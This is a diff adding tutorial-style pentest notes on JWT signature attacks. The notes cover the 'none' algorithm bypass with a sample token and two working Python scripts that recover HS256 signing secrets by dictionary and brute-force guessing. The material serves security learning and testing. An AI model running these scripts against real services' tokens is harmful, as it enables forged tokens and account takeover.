@@ -84,7 +84,7 @@ https://github.com/mazen160/jwt-pwn
 jwtXploiter is used to manipulate JWTs, bypass signature verification processes, and discover vulnerabilities.
  https://github.com/DontPanicO/jwtXploiter
 
-* signature verification attacks
+** signature verification attacks
 The signature verification processes of JWTs are crucial for ensuring their security. Signature verification vulnerabilities can compromise the integrity and trustworthiness of JWTs
 
  These attacks include bypassing signatures using the none algorithm and weak signature verification processes.
@@ -100,3 +100,119 @@ JWT signatures can be bypassed by injecting the kid parameter and using other te
 
 
 JWTs can also be vulnerable to other security issues such as replay attacks, token lifetime, and revocation problems. These attacks can occur when JWTs are reused or valid for long periods. Moreover, JWKS spoofing and attacks using jku/x5u headers fall into this category.
+
+* signature verification attack
+The signature of a JWT (JSON Web Token) is a critical component to ensure the integrity and authenticity of the token. However, if misconfigured or if weak security measures are taken, JWT signatures can be manipulated by attackers.
+
+The integrity of JWTs is ensured by combining the header and payload sections and protecting them with a signature. The signature is created using a specific algorithm and is used to verify that the JWT has not been tampered with.
+
+The generated signature is appended to the JWT, forming the final token in header.payload.signature format.
+
+** common algorithms
+*HMAC (Hash-based Message Authentication Code)* ->
+HMAC is a symmetric algorithm and uses the same secret key (private key) for both signing and verification.
+
+*RSA (Rivest-Shamir-Adleman)* ->
+RSA is an asymmetric algorithm and uses different keys for signing and verification. The private key is used for signing, while the public key is used for verification.
+
+** none algorithm attack
+One of the simplest attacks encountered in JWT verification processes is the none algorithm attack. In this attack, the signature part of the JWT is completely bypassed.
+#+begin_src python
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+#+end_src
+
+The signature part of the JWT is completely removed, transforming the token into the following format ->
+: eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
+
+* capturing the signature key
+Signature keys used to secure JWTs guarantee the integrity and authenticity of the token. However, if these keys are not strong enough or properly protected, attackers can capture them.
+
+Signature keys can be easily guessed by attackers if they are not complex and strong enough. Weak keys generally appear in the following forms:
+
+*simple and short keys* ->
+Examples include common passwords like "password," "123456," or "secret."
+
+*personal information* ->
+ Keys derived from users' names, birthdates, or other personal information.
+
+*previously compromised keys* ->
+ Keys that were leaked in previous security breaches and are reused.
+
+ Attacker can use varous tools and techniques to identift and try exploit weak keys ->
+
+ *dictionary attacks* ->
+guessing keys using predefined list of common passwords
+
+ *brute force attacks* ->
+ cracking keys by trying all possible combinations
+
+ *rainbow tables* ->
+ using precomputed hash values to perform hash comparisons
+
+** dictionary attacks
+JWT ->
+: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
+
+Dictionary Create a dictionary file, dictionary.txt, containing common passwords. You can also use password lists available on the internet.
+
+python script for dictionary attack ->
+#+begin_src python
+import jwt
+from jwt.exceptions import InvalidSignatureError
+
+jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
+header, payload, signature = jwt_token.split('.')
+
+with open('dictionary.txt', 'r') as file:
+    words = file.readlines()
+
+for word in words:
+    word = word.strip()
+    try:
+        decoded = jwt.decode(jwt_token, word, algorithms=['HS256'])
+        print(f"Secret found: {word}")
+        print(f"Decoded JWT: {decoded}")
+        break
+    except InvalidSignatureError:
+        continue
+#+end_src
+
+This code tries every word in the dictionary.txt file as the JWT's signature key. If it finds the correct key, it successfully decodes the JWT and prints out the correct key.
+
+** brute force attacks
+Brute force attacks aim to find the correct key by trying all possible combinations of characters. This method can take a significant amount of time, depending on the length and complexity of the key.
+
+JWT ->
+: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
+
+python script for brute force attack ->
+#+begin_src python
+import jwt
+from jwt.exceptions import InvalidSignatureError
+import itertools
+import string
+
+jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
+header, payload, signature = jwt_token.split('.')
+
+charset = string.ascii_lowercase  # 'abcdefghijklmnopqrstuvwxyz'
+
+def brute_force_attack(jwt_token, max_length):
+    for length in range(1, max_length + 1):
+        for attempt in itertools.product(charset, repeat=length):
+            secret = ''.join(attempt)
+            try:
+                decoded = jwt.decode(jwt_token, secret, algorithms=['HS256'])
+                print(f"Secret found: {secret}")
+                print(f"Decoded JWT: {decoded}")
+                return
+            except InvalidSignatureError:
+                continue
+
+brute_force_attack(jwt_token, 3)
+#+end_src
+
+This code tries all lowercase letter combinations of lengths 1 to 3 to guess the JWT's signature key. If it finds the correct key, it successfully decodes the JWT and prints out the correct key.
